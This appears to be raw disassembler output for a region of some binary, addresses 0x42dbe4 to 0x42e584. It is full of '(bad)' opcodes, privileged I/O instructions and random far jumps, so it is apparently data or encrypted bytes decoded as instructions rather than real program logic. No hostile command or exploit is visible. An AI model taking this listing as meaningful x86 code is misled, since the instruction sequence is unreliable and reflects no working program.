  42dbe4:	xchg   ebp,eax
  42dbe5:	cld    
  42dbe6:	add    al,0xeb
  42dbe8:	mov    ebx,DWORD PTR [ecx]
  42dbea:	fwait
  42dbeb:	jns    0x42db76
  42dbed:	jp     0x42dba7
  42dbef:	sti    
  42dbf0:	cdq    
  42dbf1:	push   ebx
  42dbf2:	div    DWORD PTR [esi]
  42dbf4:	dec    edx
  42dbf5:	inc    ebp
  42dbf6:	scas   al,BYTE PTR es:[edi]
  42dbf7:	call   0x9099:0x981c47d6
  42dbfe:	stos   BYTE PTR es:[edi],al
  42dbff:	add    ah,BYTE PTR [edx+0x4f]
  42dc02:	dec    ebx
  42dc03:	and    al,0x11
  42dc05:	xchg   edi,eax
  42dc06:	jge    0x42dbc8
  42dc08:	shr    DWORD PTR ds:0xcfeee9f2,0x54
  42dc0f:	test   BYTE PTR [eax-0x195e13ed],ch
  42dc15:	cwde   
  42dc16:	and    eax,0x75a08d52
  42dc1b:	jnp    0x42dbc3
  42dc1d:	adc    eax,0xd731ac51
  42dc22:	mov    ecx,DWORD PTR [esi+edi*8+0x5ba00f96]
  42dc29:	cld    
  42dc2a:	dec    ecx
  42dc2b:	test   BYTE PTR [edi+esi*4],bl
  42dc2e:	inc    eax
  42dc2f:	ss add eax,0x89be5a11
  42dc35:	repz dec esp
  42dc37:	lock or eax,DWORD PTR [ecx*4-0x10b320b9]
  42dc3f:	popf   
  42dc40:	and    ecx,esi
  42dc42:	inc    ecx
  42dc43:	data16 sbb dl,dl
  42dc46:	fadd   st(7),st
  42dc48:	stos   DWORD PTR es:[edi],eax
  42dc49:	jns    0x42dbe4
  42dc4b:	push   ds
  42dc4c:	test   al,0xcc
  42dc4e:	sub    eax,0xf61ba3ae
  42dc53:	inc    eax
  42dc54:	les    edx,FWORD PTR [ebp+0x4]
  42dc57:	push   esp
  42dc58:	push   eax
  42dc59:	sub    al,BYTE PTR [ebp+0x30]
  42dc5c:	xchg   esp,eax
  42dc5d:	mov    esp,0x5504af3
  42dc62:	sub    eax,0xcf085749
  42dc67:	jecxz  0x42dce4
  42dc69:	enter  0xc161,0x87
  42dc6d:	std    
  42dc6e:	and    ebp,DWORD PTR [ebx]
  42dc70:	inc    esi
  42dc71:	mov    esp,0xaac95d3b
  42dc76:	jge    0x42dc09
  42dc78:	cwde   
  42dc79:	loope  0x42dc22
  42dc7b:	ret    
  42dc7c:	jo     0x42dc1f
  42dc7e:	pushf  
  42dc7f:	fidiv  DWORD PTR [esi]
  42dc81:	mov    al,0xdc
  42dc83:	out    0xe8,al
  42dc85:	inc    esi
  42dc86:	mov    ebp,0xe74406f4
  42dc8b:	mov    DWORD PTR [esi-0x38db9b0],ecx
	...
  42dcf1:	add    BYTE PTR [eax],al
  42dcf3:	add    BYTE PTR [ecx],bh
  42dcf5:	mov    bh,0x6d
  42dcf7:	pxor   mm3,mm7
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	retf   
  42dd01:	test   DWORD PTR ds:0x1eb401d,ebx
  42dd07:	add    BYTE PTR ds:0xa5000001,al
  42dd0d:	and    eax,0x96af0ef7
  42dd12:	cld    
  42dd13:	nop
  42dd14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dd15:	sub    dh,al
  42dd17:	retf   
  42dd18:	sbb    al,BYTE PTR [eax+edi*8]
  42dd1b:	or     BYTE PTR [esi],0x5e
  42dd1e:	jne    0x42dd94
  42dd20:	xchg   edx,eax
  42dd21:	loope  0x42dd8c
  42dd23:	gs sub al,0x8a
  42dd26:	jle    0x42dda7
  42dd28:	pusha  
  42dd29:	sbb    BYTE PTR [ecx],ah
  42dd2b:	cmp    ch,ch
  42dd2d:	mov    fs,WORD PTR [eax]
  42dd2f:	xor    DWORD PTR [ebx-0x5549452a],esp
  42dd35:	mov    edi,0xf1454f6
  42dd3a:	aam    0xf8
  42dd3c:	scas   al,BYTE PTR es:[edi]
  42dd3d:	lahf   
  42dd3e:	mov    eax,ds:0x3000a4d4
  42dd43:	pusha  
  42dd44:	repz stc 
  42dd46:	fistp  QWORD PTR [ebp-0x31]
  42dd49:	(bad)  
  42dd4a:	out    dx,eax
  42dd4b:	lods   eax,DWORD PTR ds:[esi]
  42dd4c:	inc    esp
  42dd4d:	or     DWORD PTR [ebp+edx*1-0x4],0x61f2b164
  42dd55:	or     al,0xf0
  42dd57:	inc    eax
  42dd58:	sar    BYTE PTR [edx],0x79
  42dd5b:	(bad)  
  42dd5c:	cmp    BYTE PTR [ebp+0x4556b9b6],bl
  42dd62:	fisttp WORD PTR [eax+0x7d]
  42dd65:	xchg   ebx,eax
  42dd66:	jecxz  0x42dd96
  42dd68:	ins    BYTE PTR es:[edi],dx
  42dd69:	xchg   ebp,eax
  42dd6a:	xchg   DWORD PTR [ecx-0x35],edx
  42dd6d:	jecxz  0x42dd3c
  42dd6f:	call   0x9f27d399
  42dd74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dd75:	and    BYTE PTR [edx-0x2c],0x66
  42dd79:	or     esi,DWORD PTR [ebx-0x3cef69b3]
  42dd7f:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42dd81:	(bad)  
  42dd82:	(bad)  [ebx]
  42dd84:	pop    ss
  42dd85:	ja     0x42dd84
  42dd87:	add    edx,DWORD PTR [eax-0x69]
  42dd8a:	ds inc ebp
  42dd8c:	out    dx,eax
  42dd8d:	pop    ebp
  42dd8e:	mov    edx,0x8791f55d
  42dd93:	js     0x42ddde
  42dd95:	and    al,0xde
  42dd97:	sahf   
  42dd98:	cli    
  42dd99:	add    DWORD PTR [esi],eax
  42dd9b:	popf   
  42dd9c:	(bad)  [esi-0xc]
  42dd9f:	jbe    0x42dd8f
  42dda1:	add    eax,0x175fd17d
  42dda6:	in     al,0xb1
  42dda8:	jae    0x42ddce
  42ddaa:	xor    esi,DWORD PTR [eax+0x5fa12852]
  42ddb0:	icebp  
  42ddb1:	lds    ebx,FWORD PTR [edx+0x49]
  42ddb4:	pop    esi
  42ddb5:	aaa    
  42ddb6:	xchg   BYTE PTR [edx-0x468593a1],bh
  42ddbc:	gs loopne 0x42de08
  42ddbf:	and    ebx,edi
  42ddc1:	fwait
  42ddc2:	mul    BYTE PTR [eax+ecx*8-0x259559]
  42ddc9:	or     eax,DWORD PTR [ebx-0x4841521f]
  42ddcf:	jnp    0x42dd92
  42ddd1:	dec    ecx
  42ddd2:	mov    esp,0x93a136e7
  42ddd7:	enter  0x89ec,0xc0
  42dddb:	mov    esi,0x30a5fa2b
  42dde0:	inc    DWORD PTR [eax]
  42dde2:	sbb    ebx,DWORD PTR [ecx+ecx*2+0x4f]
  42dde6:	sub    BYTE PTR [esi],0x53
  42dde9:	sub    DWORD PTR ds:0x7b2fc34,ebx
  42ddef:	xor    edx,DWORD PTR [ebx+0xa6624e0]
  42ddf5:	push   edi
  42ddf6:	or     cl,bh
  42ddf8:	jle    0x42dda3
  42ddfa:	push   ds
  42ddfb:	nop
  42ddfc:	lods   al,BYTE PTR ds:[esi]
  42ddfd:	mov    ah,0x9b
  42ddff:	mov    ds:0xb2148328,eax
  42de04:	or     dl,cl
  42de06:	cmp    al,0xe5
  42de08:	jg     0x42dd94
  42de0a:	cmp    BYTE PTR [edi-0x157c9ba6],cl
  42de10:	adc    al,BYTE PTR [eax]
	...
  42de72:	add    BYTE PTR [eax],al
  42de74:	out    0x82,al
  42de76:	lods   eax,DWORD PTR ds:[esi]
  42de77:	xor    ebp,ebp
  42de79:	aas    
  42de7a:	(bad)  
  42de7b:	xlat   BYTE PTR ds:[ebx]
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	clc    
  42de81:	je     0x42def3
  42de83:	add    al,BYTE PTR [ebp-0x14]
  42de86:	add    DWORD PTR [eax],eax
  42de88:	add    eax,0x11000001
  42de8d:	ret    
  42de8e:	test   BYTE PTR [esi],dl
  42de90:	sub    cl,ah
  42de92:	xchg   ebp,eax
  42de93:	int    0xad
  42de95:	jne    0x42de2f
  42de97:	shl    DWORD PTR [ebx],cl
  42de99:	adc    ah,BYTE PTR [edx]
  42de9b:	push   ecx
  42de9c:	pushf  
  42de9d:	call   DWORD PTR [edi]
  42de9f:	pusha  
  42dea0:	nop
  42dea1:	arpl   WORD PTR [edx+esi*4],bx
  42dea4:	mov    bh,BYTE PTR ds:0xed8f72b7
  42deaa:	stos   DWORD PTR es:[edi],eax
  42deab:	out    0x69,eax
  42dead:	mov    al,0x2e
  42deaf:	das    
  42deb0:	mov    edx,0xe02d7c96
  42deb5:	pop    ebx
  42deb6:	mov    ds:0x68c1cff1,eax
  42debb:	push   0x9b6de84
  42dec0:	xlat   BYTE PTR ds:[ebx]
  42dec1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dec2:	fwait
  42dec3:	xor    dh,BYTE PTR [eax]
  42dec5:	out    dx,eax
  42dec6:	pop    eax
  42dec7:	call   0x8f0a7c1
  42decc:	mov    bh,0xab
  42dece:	or     DWORD PTR [ebp-0x29],esp
  42ded1:	xlat   BYTE PTR ds:[ebx]
  42ded2:	das    
  42ded3:	push   eax
  42ded4:	sti    
  42ded5:	cmp    DWORD PTR [ecx+0x111e7b08],edi
  42dedb:	and    bl,BYTE PTR [edi+0x3b0477b7]
  42dee1:	mov    dh,0xf
  42dee3:	mov    BYTE PTR [ebp+0x51],ah
  42dee6:	mov    ch,0x38
  42dee8:	ins    DWORD PTR es:[edi],dx
  42dee9:	rcr    ah,1
  42deeb:	inc    ebx
  42deec:	dec    esi
  42deed:	pop    eax
  42deee:	jle    0x42decb
  42def0:	jo     0x42deaf
  42def2:	sub    bh,BYTE PTR [ecx]
  42def4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42def5:	sbb    bl,BYTE PTR [ebx-0x23852cfe]
  42defb:	jmp    0x8773:0x486a49d7
  42df02:	jl     0x42df2f
  42df04:	push   ecx
  42df05:	out    dx,eax
  42df06:	cdq    
  42df07:	cli    
  42df08:	bound  edi,QWORD PTR [eax+0x65c38145]
  42df0e:	iret   
  42df0f:	mov    ah,0x19
  42df11:	daa    
  42df12:	cmp    dl,bh
  42df14:	fidiv  WORD PTR [eax+esi*1]
  42df17:	mov    al,ds:0x20b4175f
  42df1c:	adc    dl,0x7d
  42df1f:	push   cs
  42df20:	dec    edx
  42df21:	push   ss
  42df22:	mov    WORD PTR [ebx+0x13915887],?
  42df28:	fcom   DWORD PTR [edi]
  42df2a:	cmp    BYTE PTR [edx],0x9a
  42df2d:	push   0xffffff91
  42df2f:	add    al,0x6d
  42df31:	daa    
  42df32:	(bad)  
  42df34:	sahf   
  42df35:	xor    al,0xc0
  42df37:	jmp    0x6cb53534
  42df3c:	into   
  42df3d:	cs and eax,0xe9b52eeb
  42df43:	ja     0x42df69
  42df45:	mov    al,0xbf
  42df47:	sbb    BYTE PTR ds:0xefef19ee,0xa4
  42df4e:	sbb    DWORD PTR [ebx],esp
  42df50:	test   eax,0xe2ac3662
  42df55:	adc    DWORD PTR [edi],0xffffff83
  42df58:	cli    
  42df59:	mov    ds:0xb67458a6,eax
  42df5e:	push   edx
  42df5f:	xor    ecx,DWORD PTR [ebp+0x70e430ce]
  42df65:	xchg   ecx,eax
  42df66:	loope  0x42dfe6
  42df68:	jnp    0x42df2a
  42df6a:	aam    0x18
  42df6c:	shr    DWORD PTR [ebx],cl
  42df6e:	js     0x42df14
  42df70:	add    dh,BYTE PTR [ecx+0xd]
  42df73:	mov    edx,0x723e88d6
  42df78:	dec    edx
  42df79:	mov    esi,0xc06c283
  42df7e:	retf   
  42df7f:	sbb    BYTE PTR [eax+0x74],al
  42df82:	std    
  42df83:	fcmovnb st,st(7)
  42df85:	leave  
  42df86:	jae    0x42dfc8
  42df88:	mov    dh,0x1d
  42df8a:	or     BYTE PTR [eax+0x2bd0d6e2],dh
  42df90:	scas   al,BYTE PTR es:[edi]
	...
  42dff1:	add    BYTE PTR [eax],al
  42dff3:	add    BYTE PTR [edx],al
  42dff5:	(bad)  
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi+0x2a]
  42e001:	mov    bl,0xac
  42e003:	xchg   ebp,eax
  42e004:	dec    edx
  42e005:	in     eax,dx
  42e006:	add    DWORD PTR [eax],eax
  42e008:	add    eax,0xe4000001
  42e00d:	sub    DWORD PTR [ebp-0x80],esi
  42e010:	mov    edi,0x28eee9f4
  42e015:	ins    DWORD PTR es:[edi],dx
  42e016:	stc    
  42e017:	(bad)
  42e01c:	xchg   esp,eax
  42e01d:	mov    edi,0x5590560b
  42e022:	neg    BYTE PTR [edx-0x18d37525]
  42e028:	pop    ss
  42e029:	scas   eax,DWORD PTR es:[edi]
  42e02a:	sub    ebp,DWORD PTR [edi]
  42e02c:	lods   al,BYTE PTR ds:[esi]
  42e02d:	xor    eax,0x9e3098d4
  42e032:	jecxz  0x42dfc0
  42e034:	aaa    
  42e035:	cmp    eax,0xabdb3e5a
  42e03a:	xchg   ebp,eax
  42e03b:	mov    ds:0xcd289bd2,eax
  42e040:	aam    0xb7
  42e042:	in     al,dx
  42e043:	bound  bp,DWORD PTR [ebx-0x2c]
  42e047:	out    0x6b,eax
  42e049:	pop    ds
  42e04a:	ror    BYTE PTR [edi+esi*2+0x69],cl
  42e04e:	inc    eax
  42e04f:	outs   dx,DWORD PTR ds:[esi]
  42e050:	cli    
  42e051:	pop    es
  42e052:	int3   
  42e053:	xchg   ebp,eax
  42e054:	(bad)  
  42e055:	fs pop edx
  42e057:	xor    bl,al
  42e059:	popf   
  42e05a:	jg     0x42e03c
  42e05c:	add    BYTE PTR [edi+0x6902e6c],0x66
  42e063:	(bad)  
  42e065:	test   BYTE PTR [edx],0x6f
  42e068:	add    al,0x7a
  42e06b:	dec    eax
  42e06c:	cmp    al,0x3
  42e06e:	rol    al,0x1d
  42e071:	add    eax,0x92ae694a
  42e076:	jecxz  0x42e02d
  42e078:	dec    ebx
  42e079:	loopne 0x42e04c
  42e07b:	scas   eax,DWORD PTR es:[edi]
  42e07c:	mov    eax,0x8e771166
  42e081:	ds cmc 
  42e083:	jle    0x42e00a
  42e085:	pop    edx
  42e086:	adc    ebp,DWORD PTR [edi+0x13231fba]
  42e08c:	outs   dx,BYTE PTR ds:[esi]
  42e08d:	jp     0x42e067
  42e08f:	xor    ah,BYTE PTR [ebx]
  42e091:	arpl   bx,sp
  42e093:	call   0x684f:0x7706bc05
  42e09a:	xchg   ebp,eax
  42e09b:	into   
  42e09c:	push   es
  42e09d:	dec    ebp
  42e09e:	test   DWORD PTR ss:[esi+ebp*2+0x0],edx
  42e0a3:	(bad)  
  42e0a5:	or     edi,DWORD PTR [bx+di]
  42e0a8:	add    al,0x6
  42e0aa:	retf   
  42e0ab:	not    BYTE PTR [ecx-0x30ac461b]
  42e0b1:	xchg   BYTE PTR [edi-0x61],ch
  42e0b4:	das    
  42e0b5:	sbb    edx,DWORD PTR [ebp-0x67]
  42e0b8:	pop    esi
  42e0b9:	cmp    eax,0x21573307
  42e0be:	into   
  42e0bf:	stos   DWORD PTR es:[edi],eax
  42e0c0:	and    eax,0x1d66632e
  42e0c5:	cmp    dh,dl
  42e0c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e0c8:	imul   edx,DWORD PTR [ebx-0x5e],0xbb8a4b15
  42e0cf:	mov    ecx,0x8d9daf65
  42e0d4:	(bad)  
  42e0d5:	dec    edx
  42e0d6:	mov    ch,0xd4
  42e0d8:	jb     0x42e0d4
  42e0da:	test   al,0x9f
  42e0dc:	push   eax
  42e0dd:	sahf   
  42e0de:	scas   eax,DWORD PTR es:[edi]
  42e0df:	mov    eax,0x8f9cadd8
  42e0e4:	mov    dh,0xc1
  42e0e6:	pushf  
  42e0e7:	das    
  42e0e8:	mov    edi,0xa59373b8
  42e0ed:	(bad)  
  42e0ee:	std    
  42e0ef:	add    DWORD PTR [ecx-0x69],esp
  42e0f2:	push   ecx
  42e0f3:	add    al,0x4a
  42e0f5:	mov    edi,0x5bc8fd6d
  42e0fa:	outs   dx,DWORD PTR ds:[esi]
  42e0fb:	lahf   
  42e0fc:	test   BYTE PTR [edx+0x47ce5412],al
  42e102:	cmp    al,0x93
  42e104:	xor    eax,0x1f194e0b
  42e109:	xchg   ax,ax
  42e10b:	mov    dh,0x57
  42e10d:	xchg   edx,eax
  42e10e:	ret    0x81d5
	...
  42e171:	add    BYTE PTR [eax],al
  42e173:	add    BYTE PTR [ecx+0x7e061ecf],ah
  42e179:	xlat   BYTE PTR ds:[ebx]
  42e17a:	mov    ecx,0x35bb80ef
  42e17f:	xchg   edi,eax
  42e180:	inc    esi
  42e181:	rol    BYTE PTR [edx],1
  42e183:	or     ecx,DWORD PTR [edi-0x12]
  42e186:	add    DWORD PTR [eax],eax
  42e188:	add    eax,0xf0000001
  42e18d:	adc    eax,0x7b31a092
  42e192:	(bad)  
  42e193:	or     eax,0x5ddd5b7e
  42e198:	mov    WORD PTR [edx+0x67],cs
  42e19b:	push   edx
  42e19c:	rol    ecx,0x7f
  42e19f:	sahf   
  42e1a0:	in     eax,0xb1
  42e1a2:	xchg   ecx,eax
  42e1a3:	pop    es
  42e1a4:	pop    ecx
  42e1a5:	faddp  st(7),st
  42e1a7:	or     BYTE PTR [esi-0x13f1747d],al
  42e1ad:	neg    BYTE PTR [edx]
  42e1af:	and    DWORD PTR gs:[edx],esi
  42e1b2:	inc    esp
  42e1b3:	retf   0x6478
  42e1b6:	add    esp,DWORD PTR [ebp-0x1180b94e]
  42e1bc:	pop    esp
  42e1bd:	idiv   DWORD PTR [ecx]
  42e1bf:	cmp    dl,BYTE PTR [eax+0x293f6c1c]
  42e1c5:	clc    
  42e1c6:	ror    esi,1
  42e1c8:	scas   eax,DWORD PTR es:[edi]
  42e1c9:	or     DWORD PTR [ebp+0x5cef87d2],0xc2f147b
  42e1d3:	repnz arpl WORD PTR gs:[edx+0x11],di
  42e1d8:	inc    esi
  42e1d9:	fidiv  DWORD PTR [edx+0x4304dbe3]
  42e1df:	enter  0x2699,0x7a
  42e1e3:	stc    
  42e1e4:	aas    
  42e1e5:	mov    cl,0x7
  42e1e7:	scas   al,BYTE PTR es:[edi]
  42e1e8:	mov    edi,0x8e5a40b9
  42e1ed:	jmp    FWORD PTR [ebx+0x18]
  42e1f0:	lahf   
  42e1f1:	cdq    
  42e1f2:	inc    ebp
  42e1f3:	sbb    ah,BYTE PTR fs:[edi]
  42e1f6:	mov    bl,0xdb
  42e1f8:	stos   DWORD PTR es:[edi],eax
  42e1f9:	push   ds
  42e1fa:	mov    esi,0xb91935cc
  42e1ff:	cmp    al,0xaa
  42e201:	arpl   WORD PTR [edi],di
  42e203:	jge    0x42e21d
  42e205:	bound  ecx,QWORD PTR [esi+0x74]
  42e208:	mov    esi,0x3dd4a5f6
  42e20d:	push   ebx
  42e20e:	pop    es
  42e20f:	les    esp,FWORD PTR [ecx+edi*2+0x61cf704f]
  42e216:	or     BYTE PTR [edi],ah
  42e218:	sub    BYTE PTR [edx-0x4c555450],ch
  42e21e:	and    ah,BYTE PTR [ecx-0x3d]
  42e221:	scas   al,BYTE PTR es:[edi]
  42e222:	xchg   BYTE PTR [ecx+0x64e4d68],cl
  42e228:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e229:	and    esp,DWORD PTR [esi+0xb6d1b8f]
  42e22f:	mov    bl,0xb8
  42e231:	jb     0x42e1bf
  42e233:	int    0x72
  42e235:	and    al,0x92
  42e237:	ror    BYTE PTR [ebx],1
  42e239:	cmc    
  42e23a:	inc    ebx
  42e23b:	cmp    al,0xbf
  42e23d:	mov    edx,0x1525ee40
  42e242:	sti    
  42e243:	in     eax,dx
  42e244:	(bad)  
  42e245:	cld    
  42e246:	push   esp
  42e247:	sub    al,BYTE PTR [esi-0x78]
  42e24a:	mov    ah,0x7c
  42e24c:	xor    al,0x9f
  42e24e:	mov    esi,0x14352e65
  42e253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42e254:	xlat   BYTE PTR ds:[ebx]
  42e255:	add    eax,0x523bd94a
  42e25a:	in     al,dx
  42e25b:	fiadd  DWORD PTR [ebp-0x72]
  42e25e:	or     al,0xe7
  42e260:	sub    al,0xc9
  42e262:	repz xchg edi,eax
  42e264:	jbe    0x42e265
  42e266:	add    ebp,edx
  42e268:	shl    eax,0xc0
  42e26b:	jmp    0x60942e4c
  42e270:	adc    eax,0x351c5598
  42e275:	inc    edi
  42e276:	push   0xffffffa9
  42e278:	jmp    0x5669:0x4ebb89e2
  42e27f:	or     BYTE PTR [eax],0xd5
  42e282:	push   ss
  42e283:	lahf   
  42e284:	adc    al,0xf0
  42e286:	dec    ecx
  42e287:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e288:	std    
  42e289:	int    0xa4
  42e28b:	aad    0x1f
  42e28d:	pop    esp
  42e28e:	fdivr  DWORD PTR [edi+eiz*8+0x0]
	...
  42e2f1:	add    BYTE PTR [eax],al
  42e2f3:	add    BYTE PTR [ebp-0x655875c3],ch
  42e2f9:	mov    bh,0xad
  42e2fb:	aas    
  42e2fc:	mov    ebx,0x60199140
  42e301:	jl     0x42e2b6
  42e303:	cmp    edx,DWORD PTR [edi+ebp*8+0x1]
  42e307:	add    BYTE PTR ds:0x4f000001,al
  42e30d:	fsubp  st(6),st
  42e30f:	fnsave [ebx+eiz*1-0x1]
  42e313:	aad    0x55
  42e315:	inc    ebx
  42e316:	mov    al,ds:0x4ef12a6e
  42e31b:	xlat   BYTE PTR ds:[ebx]
  42e31c:	jl     0x42e2ce
  42e31e:	inc    edi
  42e31f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e320:	mov    esi,0x8351cb05
  42e326:	mov    al,ds:0x6d647f7d
  42e32b:	sbb    DWORD PTR [esi+0x20ee58f4],ebp
  42e331:	xor    esp,esp
  42e333:	push   cs
  42e334:	cmp    al,0x3c
  42e336:	shr    al,0x82
  42e339:	mov    DWORD PTR [edx-0xb40ce9],esi
  42e33f:	repnz xchg ebx,eax
  42e342:	jle    0x42e2d3
  42e344:	push   edi
  42e345:	mul    BYTE PTR gs:[ebp+0x28]
  42e349:	add    BYTE PTR [edx-0x65f61ca6],ah
  42e34f:	lock mov dl,0x79
  42e352:	jae    0x42e2eb
  42e354:	and    eax,0x250d7f69
  42e359:	xchg   ecx,eax
  42e35a:	jg     0x42e371
  42e35c:	int3   
  42e35d:	cmp    DWORD PTR [eax],esi
  42e35f:	popa   
  42e360:	sbb    al,0x2c
  42e362:	xor    al,0xc7
  42e364:	and    ah,BYTE PTR [ecx+ebp*2-0x6e49bbf4]
  42e36b:	inc    esi
  42e36c:	ret    0xf1ca
  42e36f:	mov    ds,WORD PTR [edx+0x5ea0990e]
  42e375:	nop
  42e376:	or     eax,0x1c756f0f
  42e37b:	pusha  
  42e37c:	mov    dl,0x1b
  42e37e:	into   
  42e37f:	fcom   QWORD PTR [eax+eax*4+0x61]
  42e383:	jecxz  0x42e31c
  42e385:	or     al,0xff
  42e387:	xchg   edi,eax
  42e388:	push   ebp
  42e389:	mov    dh,0x57
  42e38b:	setbe  BYTE PTR [edx]
  42e38e:	dec    ebp
  42e38f:	xor    al,0xdd
  42e391:	push   cs
  42e392:	(bad)  [edx]
  42e394:	aaa    
  42e395:	int    0x64
  42e397:	sub    ebp,DWORD PTR [ebx-0x7c38c40a]
  42e39d:	repz ret 0xfc83
  42e3a1:	dec    ecx
  42e3a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e3a3:	xor    esp,DWORD PTR [edx+0xc013de3]
  42e3a9:	mov    eax,0x91f87545
  42e3ae:	iret   
  42e3af:	sbb    eax,DWORD PTR [ebp-0x661a0cf9]
  42e3b5:	test   al,0x5e
  42e3b7:	and    al,0x4d
  42e3b9:	xor    esp,DWORD PTR [ebp+0x5fac057b]
  42e3bf:	or     DWORD PTR [eax-0x1d],ecx
  42e3c2:	xchg   ebp,eax
  42e3c3:	sub    al,0x69
  42e3c5:	(bad)  
  42e3c7:	adc    al,0x5b
  42e3c9:	mov    DWORD PTR [esi-0x44],esp
  42e3cc:	(bad)  
  42e3cd:	mov    dh,0x36
  42e3cf:	jnp    0x42e3cb
  42e3d1:	int    0x2
  42e3d3:	jns    0x42e413
  42e3d5:	sbb    ebx,DWORD PTR [ebp+0xf1b5f6]
  42e3db:	out    0x5f,eax
  42e3dd:	jb     0x42e3d4
  42e3df:	and    DWORD PTR [ebx+eax*1+0x13],eax
  42e3e3:	inc    ebp
  42e3e4:	inc    ecx
  42e3e5:	mov    ds:0x1bf55125,eax
  42e3ea:	mov    edx,0x2bd3e425
  42e3ef:	aam    0x54
  42e3f1:	sbb    edx,DWORD PTR [ecx]
  42e3f3:	sbb    esp,edx
  42e3f5:	data16 test al,0xf6
  42e3f8:	xor    DWORD PTR [esp+ecx*8],esi
  42e3fb:	dec    edi
  42e3fc:	dec    esi
  42e3fd:	dec    eax
  42e3fe:	or     DWORD PTR [esi-0xf],esp
  42e401:	xlat   BYTE PTR ds:[ebx]
  42e402:	call   0x6b2a:0x92fd9f19
  42e409:	add    al,0x75
  42e40b:	adc    eax,0x7d040831
  42e410:	mov    ecx,0x0
	...
  42e471:	add    BYTE PTR [eax],al
  42e473:	add    dl,ah
  42e475:	mov    ebp,0xe7dfc7dc
  42e47a:	sti    
  42e47b:	mov    ebp,0xe093f290
  42e480:	add    eax,0x59743b23
  42e485:	lock add DWORD PTR [eax],eax
  42e488:	add    eax,0xcd000001
  42e48d:	stos   WORD PTR es:[edi],ax
  42e48f:	mov    ebx,0xf9369cbd
  42e494:	sti    
  42e495:	jno    0x42e4f7
  42e497:	sub    esp,DWORD PTR [eax-0x4474ace3]
  42e49d:	cmp    esi,DWORD PTR [eax+0x44aa9ae4]
  42e4a3:	add    cl,BYTE PTR [ebx+0x7c]
  42e4a6:	shl    BYTE PTR [eax-0x612c1807],cl
  42e4ac:	or     DWORD PTR ds:0x9f26319c,ebp
  42e4b2:	add    edi,eax
  42e4b4:	mov    esp,0x37a85c80
  42e4b9:	mov    eax,0x674bfdbf
  42e4be:	and    al,0xf7
  42e4c0:	(bad)  
  42e4c1:	les    edx,FWORD PTR [ecx+0x52]
  42e4c4:	iret   
  42e4c5:	out    dx,eax
  42e4c6:	icebp  
  42e4c7:	div    BYTE PTR [edi+0x1d]
  42e4ca:	dec    edi
  42e4cb:	pop    edx
  42e4cc:	lea    ebp,[edi-0x14690e58]
  42e4d2:	and    eax,0x2b6b033e
  42e4d7:	sbb    edx,DWORD PTR [ecx+0x4c85ab66]
  42e4dd:	clc    
  42e4de:	sar    DWORD PTR [ebx+ebp*1+0x3a6dc8ae],cl
  42e4e5:	retf   
  42e4e6:	xchg   edx,eax
  42e4e7:	fimul  DWORD PTR [esi]
  42e4e9:	or     eax,edx
  42e4eb:	inc    esp
  42e4ec:	int3   
  42e4ed:	cmp    eax,0x352b71f6
  42e4f2:	pop    ebx
  42e4f3:	jne    0x42e4dc
  42e4f5:	mov    edi,0xaf94142b
  42e4fa:	add    eax,0x2070e123
  42e4ff:	cld    
  42e500:	cmp    dh,cl
  42e502:	add    eax,0x48770849
  42e507:	add    dh,BYTE PTR [esi]
  42e509:	data16 gs (bad) 
  42e50c:	es pushf 
  42e50e:	ins    BYTE PTR es:[edi],dx
  42e50f:	jns    0x42e4ab
  42e511:	pop    esp
  42e512:	loop   0x42e4fb
  42e514:	cmc    
  42e515:	xchg   edx,eax
  42e516:	sub    BYTE PTR [eax],0xbd
  42e519:	pop    ds
  42e51a:	or     BYTE PTR [edi+0x19],dh
  42e51d:	cdq    
  42e51e:	xchg   bl,bl
  42e520:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e521:	stos   DWORD PTR es:[edi],eax
  42e522:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e523:	xchg   ecx,eax
  42e524:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e525:	aam    0x47
  42e527:	cmp    ebx,DWORD PTR [ecx-0x6]
  42e52a:	retf   0x2775
  42e52d:	bound  edx,QWORD PTR [eax+0x6a]
  42e530:	push   0xfd33c8ec
  42e535:	ja     0x42e53b
  42e537:	cmp    ch,dh
  42e539:	pop    esi
  42e53a:	dec    ebp
  42e53b:	loop   0x42e4d2
  42e53d:	jmp    0x42e5bd
  42e53f:	push   0x65ff9f58
  42e544:	cmp    al,al
  42e546:	js     0x42e4ca
  42e548:	jae    0x42e551
  42e54a:	das    
  42e54b:	or     eax,0x69bfb371
  42e550:	(bad)
  42e553:	or     DWORD PTR [ebp+0x2b],edi
  42e556:	mov    edi,0xf9a9d024
  42e55b:	mov    ebx,0x1c151d6f
  42e560:	(bad)  
  42e561:	and    cl,BYTE PTR [eax]
  42e563:	iret   
  42e564:	ret    
  42e565:	leave  
  42e566:	in     al,dx
  42e567:	push   esi
  42e568:	fwait
  42e569:	add    bl,BYTE PTR [ebx]
  42e56b:	add    ebx,DWORD PTR [edx+0x5c]
  42e56e:	cmp    al,0x61
  42e570:	(bad)  
  42e571:	(bad)
  42e575:	jle    0x42e5c8
  42e577:	shl    dh,cl
  42e579:	ret    
  42e57a:	xchg   DWORD PTR [esi-0x6],esp
  42e57d:	xchg   edi,eax
  42e57e:	arpl   WORD PTR [eax+0x4c],dx
  42e581:	iret   
  42e582:	dec    ebx
  42e583:	cld    
  42e584:	ins    BYTE PTR es:[edi],dx
